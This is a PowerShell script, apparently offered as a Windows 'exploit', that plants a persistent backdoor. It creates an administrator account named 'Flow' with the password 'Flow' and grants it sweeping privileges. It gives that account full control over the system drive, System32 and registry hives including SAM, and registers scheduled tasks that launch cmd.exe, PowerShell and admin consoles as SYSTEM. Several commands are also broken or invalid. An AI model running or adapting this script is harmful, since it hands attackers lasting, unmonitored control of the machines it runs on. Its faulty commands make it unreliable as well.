# Check if the script is running with administrative privileges. (Is running as administrator)
if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -and (([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups | Where-Object { $_.Value -eq 'S-1-5-32-544' }))) {
    Write-Host "This script requires administrative privileges. Please run as administrator."
    exit
}

# Get the system drive and the system root dynamically through environment variables.
$SystemDrive = $env:SystemDrive
$SystemRoot = $env:SystemRoot

# Create the flow directory under the system drive.
New-Item -Path "${env:SystemRoot}\Flow" -ItemType Directory

# Add the flow directory to the system environment variables.
$CurrentPath = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
$NewPath = "$CurrentPath;${env:SystemRoot}\Flow"
[System.Environment]::SetEnvironmentVariable("Path", $NewPath, "Machine")

# ================================================================================================= #
#     Create a new local administrator on the machine, and grant it every permission needed.        #
# ================================================================================================= #

# User information.
$Username = "Flow"
$Password = "Flow"

# Create a secure password from the string.
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force

# Create a new local user on the machine.
New-LocalUser -Name $Username -Password $SecurePassword -FullName "Flow" -Description "Account created from the flow windows exploit."

# Add the local user to the administrators group.
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Grant the user logon permissions.
secpol.msc /add-user-rights $Username SeBatchLogonRight
secpol.msc /add-user-rights $Username SeInteractiveLogonRight
secpol.msc /add-user-rights $Username SeNetworkLogonRight
secpol.msc /add-user-rights $Username SeRemoteInteractiveLogonRight

# Create a list of each permission to give to the user.
$PermissionsList = @(
    "SeDebugPrivilege", 
    "SeBackupPrivilege", 
    "SeRestorePrivilege", 
    "SeTakeOwnershipPrivilege", 
    "SeIncreaseQuotaPrivilege", 
    "SeLoadDriverPrivilege", 
    "SeSystemTimePrivilege", 
    "SeRemoteShutdownPrivilege", 
    "SeManageVolumePrivilege", 
    "SeShutdownPrivilege", 
    "SeUndockPrivilege", 
    "SeIncreaseBasePriorityPrivilege", 
    "SeAssignPrimaryTokenPrivilege", 
    "SeCreatePagefilePrivilege", 
    "SeSecurityPrivilege", 
    "SeRelabelPrivilege", 
    "SeImpersonatePrivilege", 
    "SeTcbPrivilege", 
    "SeAuditPrivilege", 
    "SeChangeNotifyPrivilege", 
    "SeCreateTokenPrivilege", 
    "SeBatchLogonRight", 
    "SeInteractiveLogonRight", 
    "SeNetworkLogonRight", 
    "SeRemoteInteractiveLogonRight"
)

# For every permission in the permission list.
foreach ($Permission in $PermissionsList) {
    # Assign the permission to the new user.
    ntrights -u $Username +r $Permission
}

# Grant the user full control over the system drive.
icacls "$SystemDrive\" /grant "${Username}:(F)" /T /C

# Grant the user full control over important system folders.
icacls "$SystemRoot\System32" /grant "${Username}:(OI)(CI)F" /T /C /Q

# Grant the user full control over the flow directory.
icacls "$SystemRoot\Flow" /grant "${Username}:(OI)(CI)F" /T /C /Q

# Give the user full control over the registry.
icacls "HKCU" /grant "${Username}:(F)"
icacls "HKLM" /grant "${Username}:(F)"

# Give the user full control over specific registry keys.
icacls "HKLM:\SYSTEM\CurrentControlSet\Control" /grant "${Username}:(F)"
icacls "HKLM:\SOFTWARE\Microsoft\Windows" /grant "${Username}:(F)"
icacls "HKLM:\SAM" /grant "${Username}:(F)"

# ================================================================================================= #
#     Create many new tasks using task scheduler to automate running high permission processes.     #
# ================================================================================================= #

# List of processes to create tasks for.
$ProgramPaths = @(
    "${SystemRoot}\System32\WindowsFirewallWithAdvancedSecurity.msc",
    "${SystemRoot}\System32\WindowsPowerShell\v1.0\powershell.exe",
    "${SystemRoot}\System32\SystemPropertiesComputerName.exe",
    "${SystemRoot}\System32\SystemPropertiesPerformance.exe",
    "${SystemRoot}\System32\UserAccountControlSettings.exe",
    "${SystemRoot}\System32\SystemPropertiesProtection.exe",
    "${SystemRoot}\System32\SystemPropertiesAdvanced.exe",
    "${SystemRoot}\System32\SystemPropertiesHardware.exe",
    "${SystemRoot}\System32\SystemSettingsAdminFlows.exe",
    "${SystemRoot}\System32\SystemPropertiesComputer.exe",
    "${SystemRoot}\System32\SystemPropertiesRemote.exe",
    "${SystemRoot}\System32\DeviceManagerLauncher.exe",
    "${SystemRoot}\System32\SystemSettingsBroker.exe",
    "${SystemRoot}\System32\TaskSchedulerConsole.exe",
    "${SystemRoot}\System32\SystemConfiguration.exe",
    "${SystemRoot}\System32\SystemInformation.exe",
    "${SystemRoot}\System32\SystemProperties.exe",
    "${SystemRoot}\System32\DeviceManager.exe",
    "${SystemRoot}\System32\SystemReset.exe",
    "${SystemRoot}\System32\SecConfig.exe",
    "${SystemRoot}\System32\diskmgmt.msc",
    "${SystemRoot}\System32\msconfig.exe",
    "${SystemRoot}\System32\services.msc",
    "${SystemRoot}\System32\eventvwr.msc",
    "${SystemRoot}\System32\compmgmt.msc",
    "${SystemRoot}\System32\perfmon.exe",
    "${SystemRoot}\System32\devmgmt.msc",
    "${SystemRoot}\System32\MdSched.exe",
    "${SystemRoot}\System32\gpedit.msc",
    "${SystemRoot}\System32\cmd.exe"
)

# Set the user to run the tasks under. (Default to system)
$TaskSchedulerUser = "NT AUTHORITY\SYSTEM"

# For each program in the program paths.
foreach ($Program in $ProgramPaths) {
    # Define the task name based on the program name
    $TaskName = "Elevated Task for $([System.IO.Path]::GetFileNameWithoutExtension($Program))"

    # Create the action for the task
    $Action = New-ScheduledTaskAction -Execute $Program

    # Create the principal with highest privileges
    $Principal = New-ScheduledTaskPrincipal -UserId $TaskSchedulerUser -LogonType ServiceAccount -RunLevel Highest

    # Set the task settings to run whether the user is logged on or not
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    # Register the task
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Settings $Settings -Description "Launches a program with elevated permissions."
}
